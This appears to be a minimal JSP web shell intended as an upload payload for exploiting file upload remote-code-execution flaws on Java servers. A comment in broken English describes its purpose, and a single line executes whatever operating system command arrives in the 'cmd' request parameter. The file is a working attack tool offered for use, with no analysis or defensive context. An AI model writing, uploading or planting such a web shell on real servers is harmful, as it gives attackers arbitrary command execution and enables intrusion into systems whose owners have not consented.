<%-- This codeing we will using with File Upload RCE Bug type and This file expresses the exploited File Upload RCE if server using jsp lang ( The section follows the RCE Bug ) --%>
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
